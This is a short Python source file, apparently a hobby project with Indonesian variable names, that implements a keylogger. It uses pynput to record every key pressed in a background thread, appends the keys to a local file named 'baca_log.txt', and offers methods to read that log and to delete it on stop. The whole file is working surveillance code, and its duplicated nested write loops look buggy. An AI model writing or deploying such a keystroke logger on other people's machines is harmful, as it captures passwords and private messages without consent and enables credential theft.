from pynput.keyboard import Listener
import threading
import re
import os

class Keylogger:
    tombol = []
    hitung = 0
    path = 'baca_log.txt'

    def start_listener(self):
        global listener
        with Listener(on_press=self.key_pressed) as listener:
            listener.join()

    def start_log(self):
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def key_pressed(self, key):
        self.tombol.append(key)
        self.hitung += 1
        if self.hitung >= 1:
            self.hitung = 0
            with open(self.path, 'a') as file:
                for i in self.tombol:
                    with open(self.path, 'a') as file:
                        for i in self.tombol:
                            i = re.sub("'", "", str(i))
                            if i == "Key.enter":
                                file.write("\n")
                            elif i in("Key.shift",
                                    "Key.shift_r",
                                    "Key.ctrl",
                                    "Key.escape",
                                    "Key.up",
                                    "Key.down",
                                    "Key.left",
                                    "Key.right"
                                    ):
                                pass
                            elif i == "Key.backspace":
                                file.write(" [bkspc] ")
                            elif i == "Key.space":
                                file.write(" ")
                            elif i == "Key.tab":
                                file.write(" [tab] ")
                            elif i == "Key.caps_lock":
                                file.write(" [cpslk] ")
                            else:
                                file.write(i)
        self.tombol = []
    def baca_log(self):
        with open('baca_log.txt', 'r') as file:
            data = file.read()
            return data

    def stop_listener(self):
        listener.stop()
        os.remove(self.path)
